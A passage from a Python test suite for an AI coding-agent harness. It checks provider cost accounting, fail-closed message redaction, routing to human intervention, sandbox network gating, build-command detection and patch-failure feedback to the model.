        # provider falls back to 1.25x input — matching Anthropic's docs.
        from harness.gateway import AnthropicProvider, ModelSpec, TokenUsage
        spec = ModelSpec(
            provider="anthropic", model_id="claude-test",
            context_window=200_000,
            input_cost_per_1m=4.00,
            output_cost_per_1m=20.00,
            cached_input_cost_per_1m=0.40,
            # cache_creation_cost_per_1m left as default 0 -> fallback
        )
        provider = AnthropicProvider(spec)
        usage = TokenUsage(
            input_tokens=0, output_tokens=0,
            cached_tokens=0, cache_creation_tokens=1_000_000,
            model_name="claude-test",
        )
        # 1M creation tokens * (4.00 * 1.25) = $5.00
        assert abs(provider.compute_cost(usage) - 5.00) < 1e-6

    def test_anthropic_extract_usage_separates_read_and_creation(self):
        from harness.gateway import AnthropicProvider, ModelSpec
        spec = ModelSpec(
            provider="anthropic", model_id="claude-test",
            context_window=200_000, input_cost_per_1m=3.0, output_cost_per_1m=15.0,
        )
        provider = AnthropicProvider(spec)
        raw = {
            "usage": {
                "input_tokens": 1000,
                "output_tokens": 200,
                "cache_read_input_tokens": 5000,
                "cache_creation_input_tokens": 800,
            }
        }
        usage = provider.extract_usage(raw)
        assert usage.input_tokens == 1000
        assert usage.cached_tokens == 5000
        assert usage.cache_creation_tokens == 800

    def test_anthropic_thinking_added_to_payload_when_enabled(self):
        # Regression: chat_completion accepted `thinking=True` but never
        # passed it to the API. Verify the payload now carries the
        # `thinking` block and forces temperature=1.0.
        from harness.gateway import AnthropicProvider, ModelSpec

        spec = ModelSpec(
            provider="anthropic", model_id="claude-test",
            context_window=200_000, input_cost_per_1m=3.0, output_cost_per_1m=15.0,
            supports_thinking=True, thinking_budget_tokens=4000,
        )
        provider = AnthropicProvider(spec)

        captured: dict = {}

        class FakeResponse:
            def raise_for_status(self): pass
            def json(self):
                return {"content": [{"type": "text", "text": "hi"}],
                        "stop_reason": "end_turn",
                        "usage": {"input_tokens": 1, "output_tokens": 1}}

        class FakeClient:
            async def post(self, url, json):
                captured["payload"] = json
                return FakeResponse()

        async def fake_get_client():
            return FakeClient()

        provider._get_client = fake_get_client  # type: ignore[assignment]
        asyncio.run(provider.chat_completion(
            messages=[{"role": "user", "content": "hi"}],
            thinking=True, temperature=0.0, max_tokens=8000,
        ))
        assert "thinking" in captured["payload"]
        assert captured["payload"]["thinking"]["type"] == "enabled"
        assert captured["payload"]["thinking"]["budget_tokens"] == 4000
        # Anthropic requires temperature=1.0 when thinking is on
        assert captured["payload"]["temperature"] == 1.0

    def test_anthropic_version_read_from_spec(self):
        from harness.gateway import AnthropicProvider, ModelSpec
        spec = ModelSpec(
            provider="anthropic", model_id="claude-test",
            context_window=200_000, input_cost_per_1m=3.0, output_cost_per_1m=15.0,
            anthropic_version="2024-12-15",
        )
        provider = AnthropicProvider(spec)
        provider.api_key = "test"
        headers = provider._build_headers()
        assert headers["anthropic-version"] == "2024-12-15"

    def test_rate_limit_header_extraction(self):
        from harness.gateway import _delay_from_rate_limit_headers
        # Numeric Retry-After wins
        assert _delay_from_rate_limit_headers({"Retry-After": "30"}, 1.0, 0) == 30.0
        # Anthropic reset header is parsed
        from datetime import datetime, timezone, timedelta
        future = (datetime.now(timezone.utc) + timedelta(seconds=45)).isoformat().replace("+00:00", "Z")
        delay = _delay_from_rate_limit_headers(
            {"anthropic-ratelimit-tokens-reset": future}, 1.0, 0
        )
        assert 40 < delay < 50
        # Fallback to exponential when no header
        assert _delay_from_rate_limit_headers({}, 1.0, 3) == 8.0  # 1.0 * 2^3

    def test_openai_compute_cost_applies_cached_discount(self):
        # Regression: OpenAIProvider.compute_cost previously ignored
        # cached_tokens and billed all input_tokens at the full rate.
        from harness.gateway import OpenAIProvider, ModelSpec, TokenUsage
        spec = ModelSpec(
            provider="openai", model_id="gpt-4o-test",
            context_window=128000,
            input_cost_per_1m=10.0,
            output_cost_per_1m=30.0,
            cached_input_cost_per_1m=2.50,
        )
        provider = OpenAIProvider(spec)
        usage = TokenUsage(
            input_tokens=1_000_000, output_tokens=0, cached_tokens=800_000,
            model_name="gpt-4o-test",
        )
        # 200k uncached @ $10/M + 800k cached @ $2.50/M = $2.00 + $2.00 = $4.00
        # Previous broken behavior: 1M @ $10/M = $10.00
        assert abs(provider.compute_cost(usage) - 4.00) < 1e-6

    @pytest.mark.asyncio
    async def test_gateway_fails_closed_when_redactor_missing(self, monkeypatch):
        # Regression: previously `except ImportError: pass` allowed unredacted
        # messages out when harness.redactor was unavailable.
        import sys
        from harness.gateway import Gateway, GatewayConfig, NodeRole, register_model, ModelSpec

        # Register a fake Ollama model so dispatch gets past provider selection.
        register_model(
            "ollama:redactor-test",
            ModelSpec(
                provider="ollama", model_id="redactor-test",
                context_window=4096, input_cost_per_1m=0.0, output_cost_per_1m=0.0,
                api_base_url="http://127.0.0.1:11434/v1",
            ),
        )

        # Force `from harness.redactor import redact_messages` to fail at the
        # exact line in gateway.dispatch().
        monkeypatch.setitem(sys.modules, "harness.redactor", None)

        gateway = Gateway(GatewayConfig(planning_primary="ollama:redactor-test"))

        with pytest.raises(RuntimeError, match="redactor unavailable"):
            await gateway.dispatch(
                messages=[{"role": "user", "content": "hi"}],
                role=NodeRole.PLANNING,
                budget_remaining_usd=1.0,
            )


# ===========================================================================
# GRAPH TESTS
# ===========================================================================

def _make_state(workspace_path, initial_prompt="Test task", build_command="make build", **kwargs):
    """Helper to create initial state using keyword-only args."""
    from harness.graph import create_initial_state
    return create_initial_state(
        workspace_path=workspace_path,
        initial_prompt=initial_prompt,
        build_command=build_command,
        **kwargs,
    )


class TestAgentState:

    def test_create_initial_state(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            assert state["workspace_path"] == tmpdir
            assert len(state["messages"]) == 2
            assert state["messages"][0]["role"] == "system"
            assert state["messages"][1]["role"] == "user"
            assert state["messages"][1]["content"] == "Test task"
            assert state["build_command"] == "make build"
            assert state["exit_code"] == -1
            assert state["budget_remaining_usd"] == 2.00

    def test_create_initial_state_with_spec(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir, spec_override="# Custom Spec\n\nRequirements here")
            assert state["messages"][0]["content"] == "# Custom Spec\n\nRequirements here"

    def test_route_after_compiler_success(self):
        from harness.graph import route_after_compiler
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["exit_code"] = 0
            assert route_after_compiler(state) == "security_scan_node"

    def test_route_after_compiler_failure_repair(self):
        from harness.graph import route_after_compiler
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["exit_code"] = 1
            state["loop_counter"]["total_repairs"] = 0
            state["budget_remaining_usd"] = 1.0
            assert route_after_compiler(state) == "repair_node"

    def test_route_after_compiler_max_repairs_hitl(self):
        from harness.graph import route_after_compiler
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["exit_code"] = 1
            state["loop_counter"]["total_repairs"] = 3
            state["budget_remaining_usd"] = 1.0
            assert route_after_compiler(state) == "human_intervention_node"

    def test_route_after_compiler_budget_exhausted(self):
        from harness.graph import route_after_compiler
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["exit_code"] = 0
            state["budget_remaining_usd"] = 0.0
            assert route_after_compiler(state) == "human_intervention_node"

    def test_route_after_hitl_resume(self):
        from harness.graph import route_after_hitl
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["node_state"] = {"hitl_abandon": False}
            assert route_after_hitl(state) == "compiler_node"

    def test_route_after_hitl_abandon(self):
        from harness.graph import route_after_hitl
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["node_state"] = {"hitl_abandon": True}
            assert route_after_hitl(state) == "__end__"

    @pytest.mark.asyncio
    async def test_rewind_suspended_checkpoint_re_enters_loop(self):
        # Regression: Save & Quit ([s]) routes the graph to __end__ with
        # hitl_suspend=True. A naive `harness resume` then ainvoke(None)s on
        # an already-terminated checkpoint and exits in milliseconds with
        # 0 nodes executed. The rewind helper detects this case and stamps
        # the checkpoint so the outgoing edge from human_intervention_node
        # re-fires, routing back to compiler_node.
        from harness.graph import _rewind_suspended_checkpoint
        from unittest.mock import AsyncMock, MagicMock

        fake_state = MagicMock()
        fake_state.next = ()  # at END
        fake_state.values = {
            "node_state": {"hitl_suspend": True, "hitl_active": False},
        }
        compiled = MagicMock()
        compiled.aget_state = AsyncMock(return_value=fake_state)
        compiled.aupdate_state = AsyncMock(return_value=None)

        await _rewind_suspended_checkpoint(compiled, {"configurable": {"thread_id": "t"}})

        compiled.aupdate_state.assert_awaited_once()
        kwargs = compiled.aupdate_state.await_args.kwargs
        # The helper passes the state-update positionally and as_node by kwarg.
        # Pull values/as_node from whichever form was used.
        args = compiled.aupdate_state.await_args.args
        if "values" in kwargs:
            updates = kwargs["values"]
        else:
            updates = args[1]
        assert kwargs.get("as_node") == "human_intervention_node"
        assert updates["node_state"]["hitl_suspend"] is False
        assert updates["node_state"]["hitl_resolved"] is True
        # Loop counter is reset so one more repair cycle is allowed.
        assert updates["loop_counter"]["total_repairs"] >= 1
        assert updates["loop_counter"]["repair"] == 0

    @pytest.mark.asyncio
    async def test_rewind_suspended_checkpoint_skips_when_mid_flight(self):
        # Graph paused mid-node (state.next non-empty) should NOT be
        # rewound — normal LangGraph resume handles it.
        from harness.graph import _rewind_suspended_checkpoint
        from unittest.mock import AsyncMock, MagicMock

        fake_state = MagicMock()
        fake_state.next = ("compiler_node",)
        fake_state.values = {"node_state": {"hitl_suspend": True}}
        compiled = MagicMock()
        compiled.aget_state = AsyncMock(return_value=fake_state)
        compiled.aupdate_state = AsyncMock(return_value=None)

        await _rewind_suspended_checkpoint(compiled, {"configurable": {"thread_id": "t"}})

        compiled.aupdate_state.assert_not_awaited()

    @pytest.mark.asyncio
    async def test_rewind_suspended_checkpoint_skips_when_not_suspended(self):
        # Graph ended naturally (exit 0, abandon, etc.) → no rewind needed.
        from harness.graph import _rewind_suspended_checkpoint
        from unittest.mock import AsyncMock, MagicMock

        fake_state = MagicMock()
        fake_state.next = ()
        fake_state.values = {"node_state": {"hitl_suspend": False}}
        compiled = MagicMock()
        compiled.aget_state = AsyncMock(return_value=fake_state)
        compiled.aupdate_state = AsyncMock(return_value=None)

        await _rewind_suspended_checkpoint(compiled, {"configurable": {"thread_id": "t"}})

        compiled.aupdate_state.assert_not_awaited()

    def test_format_diagnostics_for_repair(self):
        from harness.graph import _format_diagnostics_for_repair
        errors = [
            {"file": "test.py", "line": 10, "column": 5, "severity": "error",
             "error_code": "E001", "message": "Syntax error", "semantic_context": "x = "},
        ]
        output = _format_diagnostics_for_repair(errors)
        assert "test.py" in output
        assert "E001" in output
        assert "Syntax error" in output

    def test_format_diagnostics_empty(self):
        from harness.graph import _format_diagnostics_for_repair
        output = _format_diagnostics_for_repair([])
        assert "No structured diagnostics" in output

    def test_snapshot_directory_tree(self):
        from harness.graph import _snapshot_directory_tree
        with tempfile.TemporaryDirectory() as tmpdir:
            os.makedirs(os.path.join(tmpdir, "src"))
            Path(os.path.join(tmpdir, "src", "main.py")).touch()
            Path(os.path.join(tmpdir, "README.md")).touch()
            tree = _snapshot_directory_tree(tmpdir)
            assert "src/" in tree
            assert "main.py" in tree

    def test_snapshot_directory_tree_unreadable_returns_descriptive_fallback(self, caplog):
        # Regression for Bug 8: an unreadable workspace root used to return
        # a bare "[Error reading directory: ...]" string with no warning,
        # which silently poisoned the LLM system prompt.
        import logging
        from harness.graph import _snapshot_directory_tree

        bogus_path = "/nonexistent_directory_xyz_for_bug8_test"
        with caplog.at_level(logging.WARNING, logger="harness.graph"):
            tree = _snapshot_directory_tree(bogus_path)

        # Either the os.walk yields no results (empty lines → fallback string)
        # or it raises and we log a warning. Both code paths should produce
        # output that clearly identifies the bad path so the LLM context isn't
        # silently poisoned.
        assert bogus_path in tree or "Error reading directory" in tree

    def test_memory_cleanse(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["messages"] = [
                {"role": "system", "content": "sys"},
                {"role": "user", "content": "task"},
                {"role": "assistant", "content": "debug attempt 1"},
                {"role": "user", "content": "error: fix this"},
                {"role": "assistant", "content": "debug attempt 2"},
                {"role": "user", "content": "error: try again"},
                {"role": "assistant", "content": "final fix"},
            ]
            state["loop_counter"]["total_repairs"] = 2
            state["token_tracker"]["total_cost_usd"] = 0.05
            state["token_tracker"]["total_input_tokens"] = 1000
            state["token_tracker"]["total_output_tokens"] = 500
            state["modified_files"] = ["src/main.py"]
            from harness.graph import apply_memory_cleanse
            result = apply_memory_cleanse(state)
            assert "messages" in result
            cleansed = result["messages"]
            assert len(cleansed) == 4
            assert cleansed[0]["role"] == "system"
            assert cleansed[1]["role"] == "user"
            assert cleansed[3]["role"] == "system"

    def test_memory_cleanse_few_messages(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            from harness.graph import apply_memory_cleanse
            result = apply_memory_cleanse(state)
            assert result == {}


class TestMakefileSkills:
    """The per-stack makefile_*.md skills instruct the LLM to emit a Makefile
    in its first patch so the harness's default `make build` runs against a
    real target. These tests guard the routing + allowlist wiring."""

    @staticmethod
    def _skills_dir() -> str:
        from harness import graph as graph_mod
        return os.path.join(os.path.dirname(graph_mod.__file__), "skills")

    def test_makefile_python_skill_loads_for_python_workspace(self):
        from harness.graph import _load_skills_markdown
        body = _load_skills_markdown(
            self._skills_dir(),
            max_file_chars=8000,
            workspace_tags={"python"},
        )
        assert "Python Makefile" in body
        # The single-stack tag should not pull in unrelated language skills.
        assert "Node.js / TypeScript Makefile" not in body
        assert "Rust Makefile" not in body
        assert "Go Makefile" not in body

    def test_makefile_node_skill_loads_for_node_workspace(self):
        from harness.graph import _load_skills_markdown
        body = _load_skills_markdown(
            self._skills_dir(),
            max_file_chars=8000,
            workspace_tags={"node"},
        )
        assert "Node.js / TypeScript Makefile" in body
        assert "Python Makefile" not in body

    def test_makefile_node_skill_loads_for_typescript_workspace(self):
        # typescript is in node's applies_to list — should load.
        from harness.graph import _load_skills_markdown
        body = _load_skills_markdown(
            self._skills_dir(),
            max_file_chars=8000,
            workspace_tags={"typescript"},
        )
        assert "Node.js / TypeScript Makefile" in body

    def test_makefile_rust_skill_loads_for_rust_workspace(self):
        from harness.graph import _load_skills_markdown
        body = _load_skills_markdown(
            self._skills_dir(),
            max_file_chars=8000,
            workspace_tags={"rust"},
        )
        assert "Rust Makefile" in body
        assert "Python Makefile" not in body

    def test_makefile_go_skill_loads_for_go_workspace(self):
        from harness.graph import _load_skills_markdown
        body = _load_skills_markdown(
            self._skills_dir(),
            max_file_chars=8000,
            workspace_tags={"go"},
        )
        assert "Go Makefile" in body
        assert "Java Makefile" not in body

    def test_makefile_java_skill_loads_for_java_workspace(self):
        from harness.graph import _load_skills_markdown
        body = _load_skills_markdown(
            self._skills_dir(),
            max_file_chars=8000,
            workspace_tags={"java"},
        )
        assert "Java Makefile" in body

    def test_makefile_dart_skill_loads_for_flutter_workspace(self):
        from harness.graph import _load_skills_markdown
        body = _load_skills_markdown(
            self._skills_dir(),
            max_file_chars=8000,
            workspace_tags={"flutter", "dart"},
        )
        assert "Dart / Flutter Makefile" in body

    def test_no_makefile_skill_for_unknown_stack(self):
        # A stack the harness doesn't recognize (e.g., elixir) shouldn't
        # pull in any per-language Makefile skill — late-bind handles it.
        from harness.graph import _load_skills_markdown
        body = _load_skills_markdown(
            self._skills_dir(),
            max_file_chars=8000,
            workspace_tags={"elixir"},
        )
        for stack in ("Python Makefile", "Node.js / TypeScript Makefile",
                      "Rust Makefile", "Go Makefile", "Java Makefile",
                      "Dart / Flutter Makefile"):
            assert stack not in body, f"{stack} should not load for unknown stack"

    def test_makefile_in_root_allowlist(self):
        # The patcher rejects root-level CREATE_FILE blocks not in the
        # allowlist (when a source root is detected). Makefile must be
        # listed so the LLM's Makefile-emitting patch actually applies.
        from harness.graph import _ROOT_ALLOWLIST_FILES
        assert "Makefile" in _ROOT_ALLOWLIST_FILES
        assert "makefile" in _ROOT_ALLOWLIST_FILES
        assert "GNUmakefile" in _ROOT_ALLOWLIST_FILES

    def test_layout_block_mentions_makefile(self):
        # The system-prompt layout-block enumerates allowed root files for
        # the LLM. Without Makefile in the message, the LLM won't try to
        # emit one even though the patcher would accept it.
        from harness.graph import _build_system_prompt
        with tempfile.TemporaryDirectory() as tmpdir:
            # Force the source-root branch by creating an `app/` directory
            # — without it, layout_block is empty (greenfield path).
            os.makedirs(os.path.join(tmpdir, "app"))
            with open(os.path.join(tmpdir, "app", "__init__.py"), "w") as f:
                f.write("")
            prompt = _build_system_prompt(tmpdir, "make build")
            assert "Makefile" in prompt

    @pytest.mark.asyncio
    async def test_patcher_accepts_makefile_at_root(self):
        # End-to-end: a CREATE_FILE block for `Makefile` at workspace root
        # must pass the allowlist check when the workspace has a clear
        # source root that triggers `_build_patcher_allowlist`.
        from harness.graph import _build_patcher_allowlist
        from harness.patcher import process_llm_patch_output
        with tempfile.TemporaryDirectory() as tmpdir:
            # Establish a clear source root so the allowlist activates.
            os.makedirs(os.path.join(tmpdir, "app"))
            with open(os.path.join(tmpdir, "app", "__init__.py"), "w") as f:
                f.write("")
            allowed = _build_patcher_allowlist(tmpdir)
            assert allowed is not None  # source root detected → allowlist active

            llm_output = """<<<CREATE_FILE>>>
file: Makefile
content:
.PHONY: build test all
build:
\tpython3 -m pip install -r requirements.txt
test:
\tpython3 -m pytest -q
all: build test
<<<END_CREATE_FILE>>>"""
            results, modified = await process_llm_patch_output(
                llm_output, tmpdir, allowed_paths=allowed,
            )
            assert len(results) == 1
            assert results[0].success, f"Makefile rejected: {results[0].error}"
            assert "Makefile" in modified
            assert os.path.exists(os.path.join(tmpdir, "Makefile"))


class TestToolchainAdaptation:
    """Regression: sandbox image adaptation used to fire inside compiler_node
    only — wasting the first build on the wrong base image — and was also
    not idempotent across rounds."""

    def test_adapts_ubuntu_to_python_for_pytest(self):
        from harness.graph import _apply_toolchain_adaptation
        cfg, allow_net, img_adapted, net_adapted, ro_adapted = (
            _apply_toolchain_adaptation(
                "python3 -m pytest -q", {"docker_image": "ubuntu:22.04"}, False,
            )
        )
        assert img_adapted
        assert cfg["docker_image"] == "python:3.12-slim"
        # pytest doesn't install packages — no network or read_only_root flip
        assert not net_adapted
        assert allow_net is False
        assert not ro_adapted
        assert "read_only_root" not in cfg

    def test_adapts_network_for_pip_install(self):
        # P1.3 closeout: auto-network on pip-install detection now requires
        # explicit opt-in via sandbox.auto_enable_network_for_install. Pass
        # it here so the historical behaviour is preserved end-to-end.
        from harness.graph import _apply_toolchain_adaptation
        cfg, allow_net, img_adapted, net_adapted, ro_adapted = (
            _apply_toolchain_adaptation(
                "pip install -r requirements.txt && pytest",
                {
                    "docker_image": "ubuntu:22.04",
                    "auto_enable_network_for_install": True,
                },
                False,
            )
        )
        assert img_adapted
        assert net_adapted
        assert allow_net is True
        # Install command must also flip read_only_root → False, otherwise
        # pip install fails with [Errno 30] on /root/.local.
        assert ro_adapted
        assert cfg["read_only_root"] is False

    def test_auto_network_off_refuses_to_flip(self):
        # P1.3 regression: when the opt-in is absent (the default), the
        # heuristic must NOT silently flip allow_network. Operator gets a
        # warning log; sandbox stays isolated.
        from harness.graph import _apply_toolchain_adaptation
        _cfg, allow_net, _img, net_adapted, _ro = _apply_toolchain_adaptation(
            "pip install -r requirements.txt && pytest",
            {"docker_image": "ubuntu:22.04"},  # no auto_enable_network_for_install
            False,
        )
        assert not net_adapted
        assert allow_net is False

    def test_idempotent_when_already_adapted(self):
        # Calling twice should not re-flag image_was_adapted — otherwise
        # compiler_node would log a noisy adaptation message every round
        # even though the config is already correct.
        from harness.graph import _apply_toolchain_adaptation
        cfg1, _, img1, _, _ = _apply_toolchain_adaptation(
            "pytest -q", {"docker_image": "ubuntu:22.04"}, False,
        )
        assert img1
        cfg2, _, img2, _, _ = _apply_toolchain_adaptation(
            "pytest -q", cfg1, False,
        )
        assert not img2, "second call should be a no-op"
        assert cfg2["docker_image"] == cfg1["docker_image"]

    def test_preserves_user_chosen_non_bare_image(self):
        # If the user picked a specific image (not one of the bare defaults),
        # don't override it — they know better than the heuristic.
        from harness.graph import _apply_toolchain_adaptation
        cfg, _, img_adapted, _, _ = _apply_toolchain_adaptation(
            "pytest -q", {"docker_image": "myorg/custom-python:1.0"}, False,
        )
        assert not img_adapted
        assert cfg["docker_image"] == "myorg/custom-python:1.0"

    def test_respects_explicit_read_only_root_setting(self):
        # If the user explicitly pinned read_only_root, don't override it
        # even when the build command installs packages — they're opting
        # into hard isolation knowing the build will need a baked image.
        from harness.graph import _apply_toolchain_adaptation
        cfg, _, _, _, ro_adapted = _apply_toolchain_adaptation(
            "pip install -r requirements.txt && pytest",
            {"docker_image": "python:3.12-slim", "read_only_root": True},
            True,
        )
        assert not ro_adapted
        assert cfg["read_only_root"] is True

    def test_ro_root_adaptation_is_idempotent(self):
        # Once read_only_root has been flipped to False, calling again is
        # a no-op — the key exists in cfg so the auto-flip doesn't refire.
        from harness.graph import _apply_toolchain_adaptation
        cfg1, _, _, _, ro1 = _apply_toolchain_adaptation(
            "pip install -e . && pytest",
            {
                "docker_image": "python:3.12-slim",
                "auto_enable_network_for_install": True,
            },
            False,
        )
        assert ro1
        cfg2, _, _, _, ro2 = _apply_toolchain_adaptation(
            "pip install -e . && pytest", cfg1, True,
        )
        assert not ro2, "second call should not re-flag ro_root adaptation"
        assert cfg2["read_only_root"] is False

    def test_adapter_synthesised_install_bypasses_user_optin(self):
        """Fix 2b regression: when the harness's own late-bind detection
        produced the install step (operator never typed `pip install`),
        the user's auto_enable_network_for_install opt-in does not apply
        — the harness invented the command to make a greenfield build
        possible. Otherwise the LLM repair loop wedges because pip can't
        reach the index and the user can't see why.
        """
        from harness.graph import _apply_toolchain_adaptation
        # Operator's config explicitly keeps the opt-in OFF.
        _cfg, allow_net, _img, net_adapted, _ro = _apply_toolchain_adaptation(
            "python3 -m pip install pytest && python3 -m pytest -q",
            {"docker_image": "ubuntu:22.04"},  # no opt-in
            False,
            command_is_adapter_synthesised=True,
        )
        assert net_adapted, "adapter-synthesised install must auto-enable network"
        assert allow_net is True

    def test_adapter_synthesised_does_not_help_user_typed_command(self):
        """Default path (command_is_adapter_synthesised=False) still
        respects the opt-in — we don't want a user-typed install to
        silently bypass the network gate."""
        from harness.graph import _apply_toolchain_adaptation
        _cfg, allow_net, _img, net_adapted, _ro = _apply_toolchain_adaptation(
            "pip install -r requirements.txt && pytest",
            {"docker_image": "ubuntu:22.04"},
            False,
            # default command_is_adapter_synthesised=False
        )
        assert not net_adapted
        assert allow_net is False


class TestDetectDefaultBuildCommandPyFallback:
    """Fix 2a regression: the bare-`.py`-fallback branch used to return
    `python3 -m pytest -q` with no install step. Real LLM-scaffolded
    workspaces hit pytest-not-installed and the repair loop wedged
    because adding pytest to a manifest doesn't trigger an install.
    """

    def test_top_level_py_file_bootstraps_pytest(self, tmp_path):
        from harness.cli import _detect_default_build_command
        (tmp_path / "app.py").write_text("print('hi')\n")
        cmd = _detect_default_build_command(str(tmp_path))
        assert cmd is not None
        assert "pip install pytest" in cmd
        assert "pytest" in cmd

    def test_nested_py_file_also_triggers_fallback(self, tmp_path):
        """Real run hit this: LLM created app/__init__.py + app/models.py
        but no top-level .py file. The original walk only checked the
        top level and returned None, falling back to the historical
        `make build` default and exit 127."""
        from harness.cli import _detect_default_build_command
        (tmp_path / "app").mkdir()
        (tmp_path / "app" / "__init__.py").write_text("")
        cmd = _detect_default_build_command(str(tmp_path))
        assert cmd is not None
        assert "pip install pytest" in cmd

    def test_pyproject_still_wins_over_py_fallback(self, tmp_path):
        from harness.cli import _detect_default_build_command
        (tmp_path / "pyproject.toml").write_text("[project]\nname='x'\n")
        (tmp_path / "app").mkdir()
        (tmp_path / "app" / "__init__.py").write_text("")
        cmd = _detect_default_build_command(str(tmp_path))
        # pyproject.toml branch fires first → editable install + pytest
        assert "pip install -e ." in cmd

    def test_no_python_returns_none(self, tmp_path):
        from harness.cli import _detect_default_build_command
        (tmp_path / "README.md").write_text("# hi\n")
        assert _detect_default_build_command(str(tmp_path)) is None


class TestPriorPatchFailureSurfacing:
    """Repair loop used to feed only "Failed: foo.txt" to the next LLM
    round. The detailed error (including the patcher's closest-match
    snippet) went to the logger, not the prompt — so the model proposed
    the same broken patch over and over. _format_prior_patch_failures
    is the helper that fixes this; verify it surfaces what's needed.
    """

    def test_empty_list_returns_empty_string(self):
        from harness.graph import _format_prior_patch_failures
        assert _format_prior_patch_failures([]) == ""
        assert _format_prior_patch_failures(None or []) == ""

    def test_failure_block_includes_file_op_and_full_error(self):
        from harness.graph import _format_prior_patch_failures
        failures = [{
            "file": "requirements.txt",
            "operation": "replace_block",
            "error": (
                "Search block not found in requirements.txt. Closest match:\n"
                "fastapi>=0.100,<1.0\n"
                "uvicorn[standard]>=0.23,<1.0\n"
                "pydantic-settings>=2.0"
            ),
        }]
        out = _format_prior_patch_failures(failures)
        # Header signals to the LLM that this is feedback, not new errors
        assert "Patch Failures (PREVIOUS attempt)" in out
        # File and operation are identified
        assert "requirements.txt" in out
        assert "replace_block" in out
        # The closest-match snippet — the critical signal — is preserved
        assert "fastapi>=0.100,<1.0" in out
        assert "pydantic-settings>=2.0" in out
        # Instruction explicitly tells the LLM not to re-emit verbatim
        assert "do NOT" in out.lower() or "do not" in out.lower()

    def test_multiple_failures_all_included(self):
        from harness.graph import _format_prior_patch_failures
        failures = [
            {"file": "a.py", "operation": "replace_block",
             "error": "Search block not found in a.py. Closest match:\nfoo"},
            {"file": "b.py", "operation": "create_file",
             "error": "File already exists with different content"},
        ]
        out = _format_prior_patch_failures(failures)
        assert "a.py" in out and "b.py" in out
        assert "Search block not found" in out
        assert "already exists" in out

    def test_repair_node_surfaces_failures_via_node_state(self):
        # Integration: confirm the helper is actually invoked when the
        # state carries patch_failures. We don't run the full repair_node
        # (it needs a gateway); we exercise the format helper as repair_node
        # does — calling it with the same dict shape stored by the node.
        from harness.graph import _format_prior_patch_failures
        node_state = {
            "patch_failures": [{
                "file": "requirements.txt",
                "operation": "replace_block",
                "error": "Search block not found in requirements.txt. Closest match:\nfastapi>=0.100",
            }],
        }
        block = _format_prior_patch_failures(node_state.get("patch_failures") or [])
        assert "Patch Failures" in block
        assert "requirements.txt" in block
        assert "fastapi>=0.100" in block


class TestRepairableDepHint:
    """Fix 2c regression: the hint must tell the LLM to CREATE the
    manifest file if it doesn't exist. The original phrasing assumed
    the file was already there.
    """

    def test_hint_mentions_create_for_requirements_txt(self):
        from harness.graph import _repairable_dep_hint
        hint = _repairable_dep_hint("pytest", "python3 -m pytest -q")
        assert "CREATE" in hint, "hint must mention creating the file"
        assert "requirements.txt" in hint
        assert "pytest" in hint

    def test_hint_mentions_create_for_pyproject(self):
        from harness.graph import _repairable_dep_hint
        hint = _repairable_dep_hint("ruff", "ruff check .")
        assert "CREATE" in hint
        assert "pyproject.toml" in hint


class TestDiscoveryNodes:
    """Regression: discovery nodes used to hardcode budget=2.00 and write_spec
    used to swallow OSError silently."""

    @pytest.mark.asyncio
    async def test_requirements_discovery_skips_when_budget_exhausted(self):
        from harness.graph import requirements_discovery_node
        from harness.graph import set_gateway
        from harness.gateway import Gateway, GatewayConfig

        # Configure a gateway so get_gateway() returns non-None
        set_gateway(Gateway(GatewayConfig()))
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                state = _make_state(tmpdir)
                state["budget_remaining_usd"] = 0.0
                result = await requirements_discovery_node(state)
                assert result["node_state"]["discovery_complete"] is True
                assert result["node_state"]["error"] == "budget exhausted"
                assert result["budget_remaining_usd"] == 0.0
        finally:
            set_gateway(None)

    @pytest.mark.asyncio
    async def test_architecture_discovery_skips_when_budget_exhausted(self):
        from harness.graph import architecture_discovery_node
        from harness.graph import set_gateway
        from harness.gateway import Gateway, GatewayConfig

        set_gateway(Gateway(GatewayConfig()))
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                state = _make_state(tmpdir)
                state["budget_remaining_usd"] = 0.0
                result = await architecture_discovery_node(state)
                assert result["node_state"]["discovery_complete"] is True
                assert result["node_state"]["error"] == "budget exhausted"
        finally:
            set_gateway(None)

    @pytest.mark.asyncio
    async def test_deployment_discovery_skips_when_budget_exhausted(self):
        from harness.graph import deployment_discovery_node
        from harness.graph import set_gateway
        from harness.gateway import Gateway, GatewayConfig

        set_gateway(Gateway(GatewayConfig()))
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                state = _make_state(tmpdir)
                state["budget_remaining_usd"] = 0.0
                result = await deployment_discovery_node(state)
                assert result["node_state"]["discovery_complete"] is True
        finally:
            set_gateway(None)

    @pytest.mark.asyncio
    async def test_write_spec_propagates_oserror(self):
        # Regression: write_spec used to log OSError but still return spec_written=True.
        from harness.graph import write_spec_node
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["current_gate"] = "REQUIREMENTS"
            # Make the docs dir a regular file so open() will fail with OSError
            docs = os.path.join(tmpdir, "docs")
            with open(docs, "w") as f:
                f.write("blocker\n")
            result = await write_spec_node(state)
            ns = result["node_state"]
            assert ns["spec_written"] is False
            assert "spec_write_error" in ns
            assert result["spec_requirements_path"] == ""


class TestDiscoveryRouting:

    def test_route_after_discovery_complete(self):
        from harness.graph import route_after_discovery
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["node_state"] = {"discovery_complete": True, "discovery_critical_remaining": 0}
            state["current_gate"] = "REQUIREMENTS"
            assert route_after_discovery(state) == "write_spec_node"

    def test_route_after_discovery_incomplete_with_critical(self):
        from harness.graph import route_after_discovery
        with tempfile.TemporaryDirectory() as tmpdir:
